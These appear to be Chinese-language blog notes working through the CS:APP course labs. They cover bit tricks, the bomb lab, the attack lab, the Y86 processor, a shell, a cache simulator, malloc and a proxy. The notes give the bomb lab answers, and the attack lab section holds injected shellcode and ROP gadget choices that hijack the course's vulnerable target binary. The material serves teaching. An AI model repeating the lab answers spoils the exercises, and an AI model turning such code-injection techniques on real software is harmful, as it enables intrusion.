## csapp lab学习笔记

#### 1.data lab

isLessOrEqual做差时需要考虑溢出的情况，由于是相减所以只有异号的情况可能会发生溢出，异号的话不需要做差也能得出比较结果。

howManyBits的目的其实就是获取最高的1位于哪一位，由于4字节32位所以可以使用5bit来表示，然后通过不断地将数拆成长度相等的2段，根据高的那部分是否包含1来设置每个比特。

浮点数的阶码全为1时，若尾数全为0则为无穷大，正负由符号位决定。

浮点数的阶码全为1时，若尾数不全为0则说明不是一个数即NaN。

浮点数的阶码全为0时，尾数也为0，此时无论符号位是什么都代表0；尾数不为0说明是一个无限接近于0的数。

#### 2.bomb lab

首先用objdump拿出汇编来分析。

第一关比较字符串，直接010editor打开搜一下0x2400处的字符串即可。

![image-20210206220008760](https://i.loli.net/2021/02/06/bkXtDY5uKzToG4J.png)

第二关是一个循环，每次乘2，初始值为1，所以输入1，2，4，8，16，32。

第三关根据第一个输入值跳转到不同的地方，输入0会跳转到赋予eax为0xcf的地方，因此第二个输入值为207即可。

第四关是一个二分法查数，可以通过以下两个特征看出，分别是更新上界和下界的操作。

![image-20210206221252429](https://i.loli.net/2021/02/06/ptv5hmHWgcMC7lI.png)

![image-20210206221320412](https://i.loli.net/2021/02/06/Guhy64oJXBcKa3Y.png)

注意到当猜测值偏大时，会将eax置为0，因此只要一直向左走即可通过检测。故最小值按要求为0，要查找的值也为0。

第五关以输入的低4位作为源字符的下标，源字符串为maduiersnfotvbyl，目标字符串是flyers。因此下标顺序依次为9,15,14,5,6,7。写一个程序转换成输入的字母。

```c
#include<stdio.h>
int main()
{
	int i,answer[6]={9,15,14,5,6,7};
	for(i=0;i<6;i++)
	printf("%c ",'a'-1+answer[i]);
	return 0;
}
```

得到一个结果ionefg。

第六关先检查了6个输入的数字是否互不相等，然后都用7减去它们得到新的值，然后以这个为顺序重新在栈中排序链表，最后更新数据段中存储的链表。检查则是要求链表节点中存储的数据降序排序。

![image-20210206221729356](https://i.loli.net/2021/02/06/6RPt7mIxM9Joi8d.png)

不难得出排序：3 4 5 6 1 2

答案就是：4 3 2 1 6 5

第七关是隐藏关，通过以下部分可以得知判断是否能够进入隐藏关的密钥位于0x402622处，是一个字符串DrEvil。

![image-20210206221918723](https://i.loli.net/2021/02/06/PDzu4GfMYolHEcy.png)

接下来通过gdb调试发现到这处关键逻辑之前有一个sscanf，输入是0 0，而其后还可以跟一个字符串。因此就是在此处输入DrEvil，而我们输入0 0的地方只有第四关，所以在第四关时输入0 0 DrEvil就可以进入隐藏关。

![image-20210206222330249](https://i.loli.net/2021/02/06/etWaysNQv2u6zg9.png)

第七关是一棵二叉树，大概是这样的。

                        24
              8                      32
        6         16           2d           6b
     1     7   14    23    28      2f    63     3e9

向左走的话返回值为2\*x，向右走的话返回值为2\*x+1，而叶子节点返回0。因此要得到目标的2就必须(0\*2\*2+1)*2，也就是左右左即可，得到答案0x14。

#### 3.attack lab

看到群里dalao说2个都可以一穿多就直接按这个目标来做了。核心思路是避免在touch之后就exit可以改掉got表中的exit。

第一个代码注入需要利用一个pop rdi的gadget和getbuf配合来向mmap出来的内存中写入shellcode。

shellcode如下：

```asm
mov rax, 0x006040E8
mov dword [rax], 0x5558601a
mov rax, 0x00604AA0
mov dword [rax], 0x00000000
mov rax, 0x00604AA0
cmp dword [rax], 0x01
je Label1
cmp dword [rax], 0x02
je Label2
mov rdx, 0x00604AA0
inc dword [rdx]
mov rax, 0x004017C0
jmp rax
Label1:
mov rdi, 0x59B997FA
mov rdx, 0x00604AA0
inc dword [rdx]
mov rax, 0x004017EC
jmp rax
Label2:
mov rax, 0x00604AB0
mov dword [rax], 0x39623935
add rax,4
mov dword [rax], 0x61663739
mov rax, 0x006040E8
mov dword [rax], 0x00400E46
mov rdi,0x00604AB0
mov rax, 0x004018FA
jmp rax
```

第二个ROP看readme提示只有phase4和5，因此推测需要完成的是touch2和touch3。在farm中找一找好用的gadget即可，可以用mov rdi,rax和pop rax来设置rdi，利用xchg ecx,eax和xchg eax,[rcx+0x48]来写内存。

#### 4.arch lab

partA要求写y86-64风格的代码，和x86-64差别不大，只是mov指令变化比较大——根据操作数为立即数，寄存器，内存地址的情况可分为irmovq，rrmovq，mrmovq和rmmovq。然后就是操作数的表示与顺序也类似于AT&T风格的汇编。

partB要求添加一条iaddq的汇编指令，可以仿照irmovq指令的实现来写。同样是需要常数的，常数作为ALU的A端口输入，但不同的地方在于目标寄存器会作为ALU的B端口输入，而且iaddq会更改状态寄存器。

整个过程仿照csapp书上的写法如下：

```
Fetch icode:ifun <- M1[PC]
      rA:rB <- M1[PC+1]
      valC <- M8[PC+2]
      valP <- PC+10
Decode  valB <- R[rb]
Execute valE <- valB + valC
Memory
Write back R[rb] <- valE
PC update PC <- valP
```

partC要求优化数组copy操作。主要的优化方式就是循环展开，我进行了9×9的循环展开。这部分循环中从源数组读取数据与将数据写入目标数组的操作需要分开，这是因为若是紧接着的话，前一条指令还处于写回阶段，而后一条就到执行阶段了，由于需要的数据还没写入寄存器，后一条指令必须空泡一次，导致了性能的浪费。

显然展开的越多，跳转次数也就越少，程序效率应该更高。但实际上9×9比8×8反而得分低了，这是因为我使用了普通的循环处理多余部分的数据，这部分对于性能的影响是很大的。为了优化这部分我看到网上dalao推荐使用三叉树，所以我就写了一个三叉树，只需要根据不同的分支跳转到后续复制操作中的某一处即可。最终得分49分，要想继续优化可能需要大改hcl文件消除冒险才行了。

![image-20210213151651511](https://i.loli.net/2021/02/13/6eQqSktf3yo9T7P.png)

![image-20210213151745004](https://i.loli.net/2021/02/13/xpPdgjKmhRAwnty.png)

#### 5.shlab

实现思路是先判断用户的命令是否是后台job，若不是则在之后的子进程执行命令时父进程需要调用waitfg来等待该job完成。随后判断是否是shell的内建命令，若是可以直接执行不需要fork子进程，也不需要添加job到jobs数组中。子进程的管理是通过信号处理函数实现的，此外还有处理用户输入fg和bg命令的do_bgfg函数，它需要向进程发送SIGCONT信号来让子进程继续执行，并修改jobs中对应job的状态。

这个lab里比较新的知识是信号，实际上真正能够干预fork出来的子进程行为的就是信号，对jobs数组中进程状态的修改只是逻辑上的控制。

由于用户在按下ctrl+c和ctrl+z时通常是为了中止当前终端的进程，所以在sigint_handler和sigtstp_handler中我们要处理的就是处于fg的job，分别向对应子进程发送sigint和sigtstp即可，后者还需要更改job的状态为ST。这么做的前提是终端发送的信号只有我们的shell进程能够接收到，但ctrl+c，ctrl+z等命令将信号发送到前台进程组，而fork出来的子进程也属于前台进程组，所以我们在子进程中需要调用setpgid来改变其所属的进程组。

比较困难的一个信号是sigchld，当子进程退出时会向父进程发送这个信号，普通的思路是接到这个信号就循环waitpid处理掉所有终止的子进程。但这么做就无法通过第16个trace，因为当其他进程向子进程发送sigint或sigtstp导致子进程向父进程发送sigchld，父进程是不会收到sigint或sigtstp信号的，这样父进程只会简单地清理掉这些子进程而无法输出提示信息。正确的做法是使用WIFEXITED、WIFSIGNALED和WIFSTOPPED来判断子进程状态，从而进行不同的处理和输出不同的提示信息，其中处于暂停状态的子进程是不需要清理的。

实验提示中提到的另一个难点是在fork出子进程时要屏蔽sigchld信号，否则可能会出现刚fork出一个子进程，此时另一个子进程向父进程发送了sigchld信号，父进程把这两个子进程一起清理了的竞争情况。屏蔽信号通过sigprocmask实现，解除屏蔽也是这个函数。

#### 6.cache lab

partA要求我们实现一个使用LRU替换策略的cache。

Cache的基本单位是行，每一行存储一个主存块的数据，行的大小由主存块大小决定。更高一级的单位是组，Cache 总行数除以每组包含的行数得到总组数，主存块地址去除低位字号后对组数取模得到对应组号，商为标记。在 Cache 中将组号和标记结合起来实现对主存块的快速查找。每个主存单元去掉高位的标记和组号即为字号。若主存地址共 n 位，标记和组号共占 m 位，则字号有 n-m 位，相应的主存块大小为$2^{n-m}$。设 Cache 一共有 x 行，每组含有y 行，则组号占了前 m 位的低${log_2{\frac{x}{y}}}$位，标记占高m - ${log_2{\frac{x}{y}}}$位。

测试中会将总组数，每组包含行数，主存块大小以命令行参数的方式提供给我们。

partB要求我们利用cache对矩阵转置进行优化。一共包含三个测试，分别是32×32，64×64和67×61的。

由于提供的cache为32×1×32的，所以每组只有一行，每行可以容纳8个整数，组与组之间间隔256个整数。

对于32×32的矩阵来说，用256除以32正好得到8，所以按8×8的子矩阵进行转置可以保证所有操作的整数都在cache中。但需要注意的是A，B两个矩阵的地址相差也正好是32×32的整数倍，所以对于对角线上的子块来说，直接将A中对应位置的数复制到B中去还是会造成组与组之间的冲突。因此选择使用8个局部变量来存储A一行的数据，然后也按行写入到B中去，每个子矩阵复制到B之后再进行一次转置，这次转置可以利用到B仍然残留在cache中的行所以不会增加miss次数。

64×64的矩阵就比较麻烦了，因为组与组之间只间隔了4行，但cache一行仍然是8个整数。按8×8分块在写后1行后4个整数时会造成冲突，按4×4分块一行8个整数又会少读了4个。这个地方我自己优化只能到1600的miss，最后还是看了dalao的思路才写出来的满分代码。

核心思路就是8×8分块，但还要把8×8分成4个4×4的子块。第一步是将后四个会造成冲突的整数暂存到前四个整数的同一行，要注意的是要以转置的方式复制。第一行复制完毕后B的子矩阵会变成下面这种样子。

1     n     n     n    5    n     n      n

2     n     n     n    6    n     n      n

3     n     n     n    7    n     n      n

4     n     n     n    8    n     n      n

按照这种方式将A子块的前4行复制完毕，第二步就是将A子块左下角的4×4块放到B的右上角，在替换之前当然要把之前暂存的数复制到B的左下角子块，由于事先已经转置好了，可以直接按行复制，所以刚好不会造成冲突。

最后一步就是把A子块的右下角4×4子块存到B子块的右下角4×4子块了，由于之前恢复B左下角子块的数使得cache中已经存入了这4行，所以这一步也不会造成miss。

67×61的矩阵由于列数无法除尽256，所以很难按之前2个矩阵的方法去分析。但好在miss要求不是很高，直接按8×8的子块进行转置就可以达到满分，要注意判断一下不足8的情况就行。

![image-20210213115156733](https://i.loli.net/2021/02/13/2Rz9x6sQOCfPlkb.png)

#### 7.malloc lab

这个实验要求我们自己实现一个内存管理器。一开始我想要仿照ptmalloc的机制来实现，奈何各种bins太复杂了，于是最终还是选择实现隐式的freelist。我使用的堆块头一共8字节，前4字节存储上一个相邻堆块的大小，后四字节存储本堆块大小，由于堆块大小按8字节对齐，所以低3位是无用的，用最低位来表示本堆块是否空闲。内存分配算法使用的是next match。free的思路也很简单，就是合并相邻空闲堆块。realloc和free差不多，也是尝试合并相邻空闲堆块，若空间仍然不够就直接重新分配。

实验文件中没有提供相应trace文件，我找到后测试的分数如下。

![image-20210213120455179](https://i.loli.net/2021/02/13/ve6EMUki5jp2r8l.png)

#### 8.proxy lab

这个实验要求我们写一个带cache的多线程代理服务器，就是接收客户端发来的包，若是cache中没有用户请求的资源就把请求转发到真正的服务器，再把服务器的回应发给客户端，同时存入cache中。

实现细节主要是将请求包的一些字段改成实验所要求的，如把http1.1改为http1.0，将connection改为close。对于cache的设计，我使用了4个全局数组，分别用于存储object本身，object名称，object的LRU计数和object大小。线程同步使用pthread的读写锁。

![image-20210213121335592](https://i.loli.net/2021/02/13/woFlKEp3nrxiNfd.png)
